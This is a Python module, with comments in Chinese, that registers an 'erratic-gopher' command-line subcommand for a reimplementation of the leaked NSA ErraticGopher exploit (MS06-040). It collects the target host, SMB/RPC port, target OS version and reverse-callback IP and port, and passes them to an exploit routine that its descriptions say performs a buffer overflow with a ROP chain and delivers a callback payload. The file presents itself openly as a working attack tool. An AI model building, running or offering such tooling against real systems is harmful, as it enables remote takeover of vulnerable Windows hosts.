"""erratic-gopher — MS06-040 / ERRATICGOPHER RPC 远程利用。

Python 重写的 NSA ErraticGopher 利用工具 `Erraticgopher-1.0.1.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 RPC/NetAPI 利用流程。
"""

from . import erratic_gopher


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def erratic_gopher_handle(args):
    """Run the ERRATICGOPHER exploitation sequence against the supplied host."""
    return erratic_gopher.run_function(
        target=args.target,
        port=args.port,
        connection_direction=args.connection_direction,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        target_os=args.target_os,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `erratic-gopher` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "erratic-gopher",
        help="ERRATICGOPHER RPC 远程利用",
        description="Python 重写的 NSA ErraticGopher (ERRATICGOPHER) 利用工具 "
                    "Erraticgopher-1.0.1。通过 RPC Endpoint Mapper / NetAPI 通道，"
                    "执行缓冲区溢出与 ROP 链利用，并可选投递 egg 回连载荷。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标 RPC 端口（默认 445）",
    )
    p.add_argument(
        "--connection-direction",
        type=int, choices=[0, 1], default=0,
        help="Egg 回连方向：0=Reverse callback（目标连回），1=Forward callback（默认 0）",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Reverse callback 模式：目标连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 或 call-in 端口",
    )
    p.add_argument(
        "--target-os",
        choices=["XPSP3", "W2K3SP0", "W2K3SP1", "W2K3SP2"],
        default="XPSP3",
        help="目标操作系统与服务包（默认 XPSP3）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=erratic_gopher_handle)
